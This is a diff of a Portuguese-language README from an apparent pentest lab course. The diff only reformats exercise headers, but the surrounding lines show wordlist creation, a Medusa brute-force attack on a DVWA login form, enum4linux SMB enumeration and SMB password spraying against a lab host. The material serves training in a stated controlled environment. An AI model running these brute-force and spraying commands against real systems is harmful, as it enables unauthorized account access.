@@ -43,7 +43,7 @@ Todos os testes foram realizados em ambiente controlado e exclusivamente para fi
 
 🚀 Simulação Prática de Ataques
 
-📌 Exercício 1 – Criação de Wordlists<br>
+# 📌 Exercício 1 – Criação de Wordlists<br>
 
 Criação de listas de usuários e senhas para uso em ataques automatizados.
 
@@ -51,7 +51,7 @@ Criação de listas de usuários e senhas para uso em ataques automatizados.
 - echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 - echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
  
-📌 Exercício 2 – Ataque HTTP com Medusa<br>
+# 📌 Exercício 2 – Ataque HTTP com Medusa<br>
 
 Ferramenta utilizada: Medusa<br>
 Objetivo: realizar ataque de força bruta contra formulário de login (DVWA).
@@ -61,7 +61,7 @@ Objetivo: realizar ataque de força bruta contra formulário de login (DVWA).
 - -m FORM:'username=^USER^password=^PASS^Login=Login' \
 - -m 'FAIL=Login failed' -t 6
 
-📌 Exercício 3 – Enumeração SMB<br>
+# 📌 Exercício 3 – Enumeração SMB<br>
 
 Ferramenta utilizada: Enum4linux<br>
 Objetivo: coletar informações sobre usuários e compartilhamentos via SMB.
@@ -69,14 +69,14 @@ Objetivo: coletar informações sobre usuários e compartilhamentos via SMB.
 - enum4linux -a 192.168.56.101 | tee enum4_output.txt
 - less enum4_output.txt
  
-📌 Exercício 4 – Password Spraying via SMB<br>
+# 📌 Exercício 4 – Password Spraying via SMB<br>
 
 Ferramenta utilizada: Medusa
 
 - echo -e "user\nmsfadmin\nservice" > smb_users.txt
 - medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 
-📌 Exercício 5 – Enumeração de Compartilhamentos<br>
+# 📌 Exercício 5 – Enumeração de Compartilhamentos<br>
 
 Ferramenta utilizada: SMBClient
 
